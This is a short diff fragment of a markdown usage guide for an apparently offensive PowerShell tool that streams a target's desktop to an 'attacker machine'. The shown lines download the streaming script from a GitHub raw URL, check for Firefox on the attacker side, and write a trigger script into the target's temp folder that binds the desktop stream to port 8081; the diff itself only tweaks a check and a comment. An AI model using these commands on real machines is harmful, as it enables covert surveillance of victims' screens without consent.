@@ -16,14 +16,14 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream
 **prerequesites:**
 ```powershell
 #Make sure Firefox ( with MJPEG ) its installed on attacker machine
-[bool](Get-ItemProperty -Path "HKLM:\SOFTWARE\Mozilla\Mozilla Firefox" -EA SilentlyContinue).CurrentVersion
+[bool](Get-ItemProperty -Path "HKLM:\SOFTWARE\Mozilla\Mozilla Firefox" -EA SilentlyContinue)
 ```
 
 <br />
 
 **execute:**
 ```powershell
-#Build triggers script (remote)
+#Build trigger script (remote)
 echo "Import-Module -Name $Env:TMP\Stream-TargetDesktop.ps1 -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
 Add-Content -Path "$Env:TMP\trigger.ps1" -Value "TargetScreen -Bind -Port 8081"
 
